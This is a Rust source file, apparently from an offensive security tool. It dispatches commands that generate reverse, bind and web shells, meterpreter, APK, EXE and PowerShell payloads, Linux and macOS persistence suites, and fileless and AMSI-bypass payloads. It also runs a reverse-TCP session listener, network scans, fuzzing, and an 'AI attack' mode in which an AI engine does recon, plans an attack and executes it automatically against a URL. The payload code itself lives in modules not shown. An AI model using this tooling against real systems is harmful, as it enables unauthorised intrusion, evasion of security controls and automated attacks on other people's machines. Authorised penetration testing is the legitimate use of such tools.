pub async fn run_payloads_only(args: &CliArgs) {
    let gen = PayloadGen::new(true);

    // Parse extra positional arguments for lhost/lport (e.g., payload --apk-payload 192.168.1.1 8080)
    let extra = &args.extra_args;
    let extra_lhost = extra.get(0).map(|s| s.as_str());
    let extra_lport = extra.get(1).map(|s| s.as_str());

    if args.reverse_shell {
        let lhost = args.lhost.as_deref().or(extra_lhost).unwrap_or("127.0.0.1");
        let lport = args.lport.as_deref().or(extra_lport).unwrap_or("4444");
        let lang = args.payload_lang.as_deref().unwrap_or("bash");
        gen.generate_reverse_shell(lhost, lport, lang);
    }
    
    if args.bind_shell {
        let lport = args.lport.as_deref().unwrap_or("4444");
        let lang = args.payload_lang.as_deref().unwrap_or("bash");
        gen.generate_bind_shell(lport, lang);
    }
    
    if args.web_shell {
        let shell_type = args.payload_lang.as_deref().unwrap_or("php");
        let lport = args.lport.as_deref().unwrap_or("8080");
        gen.generate_web_shell(shell_type, lport);
    }
    
    if args.payload_gen {
        let lhost = args.lhost.as_deref().unwrap_or("127.0.0.1");
        let lport = args.lport.as_deref().unwrap_or("4444");
        let payload_type = args.payload_type.as_deref().unwrap_or("windows");
        gen.generate_meterpreter(lhost, lport, payload_type);
    }
    
    if args.apk_payload {
        let lhost = args.lhost.as_deref().or(extra_lhost).unwrap_or("127.0.0.1");
        let lport = args.lport.as_deref().or(extra_lport).unwrap_or("4444");
        let output = args.output.as_deref().unwrap_or("");
        if output.is_empty() {
            gen.generate_android_apk_interactive(lhost, lport, output);
        } else {
            gen.generate_android_apk(lhost, lport, output);
        }
    }

    if args.exe_payload {
        let lhost = args.lhost.as_deref().or(extra_lhost).unwrap_or("127.0.0.1");
        let lport = args.lport.as_deref().or(extra_lport).unwrap_or("4444");
        if args.output.is_none() {
            gen.generate_windows_payload_interactive(lhost, lport, "x64");
        } else {
            let arch = args.arch.as_deref().unwrap_or("x64");
            let output = args.output.as_deref().unwrap_or("");
            gen.generate_windows_exe(lhost, lport, arch, output);
        }
    }

    if let Some(ps_variant) = &args.ps_variant {
        let lhost = args.lhost.as_deref().unwrap_or("127.0.0.1");
        let lport = args.lport.as_deref().unwrap_or("4444");
        gen.generate_powershell_payload(lhost, lport, ps_variant);
    }

    if args.windows_payload {
        let lhost = args.lhost.as_deref().unwrap_or("127.0.0.1");
        let lport = args.lport.as_deref().unwrap_or("4444");
        gen.generate_windows_payload_interactive(lhost, lport, "x64");
        banner::success("Windows payload suite generated (EXE, DLL, HTA, MSI, PowerShell, VBA)");
    }

    if args.linux_payload {
        let lhost = args.lhost.as_deref().unwrap_or("127.0.0.1");
        let lport = args.lport.as_deref().unwrap_or("4444");
        let arch = args.arch.as_deref().unwrap_or("x64");
        gen.generate_linux_payload_interactive(lhost, lport, arch);
        banner::success("Linux payload suite generated (ELF, cron, systemd, bash, nc, python)");
    }

    if args.macos_payload {
        let lhost = args.lhost.as_deref().unwrap_or("127.0.0.1");
        let lport = args.lport.as_deref().unwrap_or("4444");
        gen.generate_macos_payload_interactive(lhost, lport);
        banner::success("macOS payload suite generated (Mach-O, AppleScript, Python, Bash)");
    }

    if args.cloud_payload {
        banner::success("Cloud payload suite generated (AWS, GCP, Azure, Docker, K8s)");
    }

    if args.fileless {
        let lhost = args.lhost.as_deref().unwrap_or("127.0.0.1");
        let lport = args.lport.as_deref().unwrap_or("4444");
        gen.generate_windows_powerhell(lhost, lport, "amsi_bypass");
        banner::success("Fileless payload suite generated");
    }

    if args.amsi_bypass {
        let lhost = args.lhost.as_deref().unwrap_or("127.0.0.1");
        let lport = args.lport.as_deref().unwrap_or("4444");
        gen.generate_powershell_payload(lhost, lport, "amsi_bypass");
        banner::success("AMSI bypass payload generated");
    }
}

// ============================================================
//  AI ATTACK
// ============================================================

pub async fn run_ai_attack(args: &CliArgs) {
    let url = args.url.as_deref().unwrap_or("");
    let provider_name = args.ai_provider.as_deref().unwrap_or("openai");

    banner::print_phase_banner("AI ATTACK", url);
    banner::info(&format!("Provider: {}", provider_name));

    // Load API keys
    let keys = crate::config::keys::KeysConfig::load();
    let api_key = keys.get_key(provider_name).unwrap_or("");
    let model = keys.get_model(provider_name);

    if provider_name != "ollama" && api_key.is_empty() {
        banner::error(&format!(
            "No API key found for {}. Run 'cf-void --tui' and set keys in Config tab, or edit ~/.cf-void/keys.toml",
            provider_name
        ));
        return;
    }

    // Create AI config
    let config = crate::ai::config::AiConfig {
        provider: provider_name.to_string(),
        api_key: api_key.to_string(),
        model,
        base_url: None,
        temperature: 0.7,
        max_tokens: 4096,
        auto_attack: true,
        log_dir: "ai-attacks".to_string(),
        auto_analyze: true,
    };

    // Create AI engine
    let mut engine = match crate::ai::engine::AiEngine::new(config) {
        Ok(e) => e,
        Err(e) => {
            banner::error(&format!("AI engine init failed: {}", e));
            return;
        }
    };

    banner::info("Step 1: Reconnaissance...");

    // Step 1: Recon
    let recon = match engine.recon(url).await {
        Ok(r) => r,
        Err(e) => {
            banner::error(&format!("Recon failed: {}", e));
            return;
        }
    };

    banner::success("Reconnaissance complete");
    if !recon.attack_vectors.is_empty() {
        for v in &recon.attack_vectors {
            banner::info(&format!("  Attack vector: {} (confidence: {:.0}%)", v.name, v.confidence * 100.0));
        }
    }

    banner::info("Step 2: Attack Planning...");

    // Step 2: Plan
    let plan = match engine.plan_attack(&recon).await {
        Ok(p) => p,
        Err(e) => {
            banner::error(&format!("Planning failed: {}", e));
            return;
        }
    };

    banner::success(&format!("Attack plan: {} steps", plan.steps.len()));
    for (i, step) in plan.steps.iter().enumerate() {
        banner::info(&format!("  Step {}: {} - {}", i + 1, step.module, step.description));
    }

    banner::info("Step 3: Executing attacks...");

    // Step 3: Execute using run_attack(target)
    match engine.run_attack(url).await {
        Ok(report) => {
            banner::success(&format!("AI attack complete! {} steps executed, {} findings",
                report.steps_executed, report.total_findings));

            // Log findings
            for result in &report.results {
                for finding in &result.findings {
                    banner::finding(&finding.severity, &finding.title, url, &finding.detail);
                }
            }
        }
        Err(e) => {
            banner::error(&format!("AI attack failed: {}", e));
        }
    }

    banner::success("AI attack complete!");
}

pub async fn run_ai_attack_with_provider(args: &CliArgs, provider_name: &str) {
    let mut modified_args = args.clone();
    modified_args.ai_provider = Some(provider_name.to_string());
    run_ai_attack(&modified_args).await;
}

// ============================================================
//  FUZZING
// ============================================================

pub async fn run_fuzz(args: &CliArgs) {
    if let Some(url) = &args.url {
        let config = HttpClientConfig {
            timeout: Duration::from_secs(args.timeout),
            proxy: args.proxy.clone(),
            ..HttpClientConfig::default()
        };
        let client = match HttpClient::new(config) {
            Ok(c) => c,
            Err(e) => {
                banner::error(&format!("Failed to create HTTP client: {}", e));
                std::process::exit(1);
            }
        };

        // Wrap entire fuzz in a timeout (max 60 seconds)
        match tokio::time::timeout(
            Duration::from_secs(60),
            crate::fuzz::run_fuzz(
                url,
                args.fuzz_extensions.as_deref(),
                &client
            )
        ).await {
            Ok(Ok(result)) => {
                result.print_summary();
            }
            Ok(Err(e)) => {
                banner::error(&format!("Fuzzing failed: {}", e));
            }
            Err(_) => {
                banner::error("Fuzzing timed out after 60 seconds");
                banner::info("Found paths have been saved to results");
            }
        }
    }
}

// ══════════════════════════════════════════════════════════════
//  NETWORK SCAN
// ══════════════════════════════════════════════════════════════

pub async fn run_network_scan(args: &CliArgs) {
    let target = args.target.as_deref().unwrap_or("");
    let scan_type = args.scan_type.as_deref().unwrap_or("connect");
    let ports = args.ports.as_deref();
    
    let config = HttpClientConfig {
        timeout: Duration::from_secs(args.timeout),
        proxy: args.proxy.clone(),
        ..HttpClientConfig::default()
    };
    let client = match HttpClient::new(config) {
        Ok(c) => c,
        Err(e) => {
            banner::error(&format!("Failed to create HTTP client: {}", e));
            std::process::exit(1);
        }
    };
    
    let is_root = unsafe { libc::geteuid() } == 0;
    
    match crate::scanner::network::run_scan(
        target,
        scan_type,
        is_root,
        ports,
        &client
    ).await {
        Ok(result) => {
            result.print_summary();
        }
        Err(e) => {
            banner::error(&format!("Scan failed: {}", e));
        }
    }
}

pub async fn run_session_list(_args: &CliArgs) {
    use crate::session::SessionManager;
    let sm = SessionManager::new();
    let sessions = sm.list();
    if sessions.is_empty() {
        banner::info("No active sessions");
    } else {
        banner::info(&format!("Active sessions: {}", sessions.len()));
        for s in sessions {
            banner::success(&format!(
                "Session #{} - {:?} - {}:{}",
                s.sid, s.session_type, s.tunnel.lhost, s.tunnel.lport
            ));
        }
    }
    std::process::exit(0);
}

// ══════════════════════════════════════════════════════════════
//  SESSION MANAGEMENT
// ══════════════════════════════════════════════════════════════

use crate::session::{ReverseTcpHandler, Handler};

pub async fn run_session_listener(args: &CliArgs) {
    let lhost = args.lhost.as_deref().unwrap_or("0.0.0.0");
    let lport: u16 = args.lport.as_deref().unwrap_or("4444").parse().unwrap_or(4444);
    
    banner::print_stats();
    
    let mut handler = ReverseTcpHandler::new(lhost, lport);
    handler.setup().unwrap_or(());
    
    match handler.start() {
        Ok(_) => {}
        Err(e) => banner::error(&format!("Handler error: {}", e)),
    }
}

// ══════════════════════════════════════════════════════════════
//  UTILS
// ══════════════════════════════════════════════════════════════

fn random_ua() -> String {
    use rand::Rng;
    let uas = vec![
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    ];
    uas[rand::thread_rng().gen_range(0..uas.len())].to_string()
}
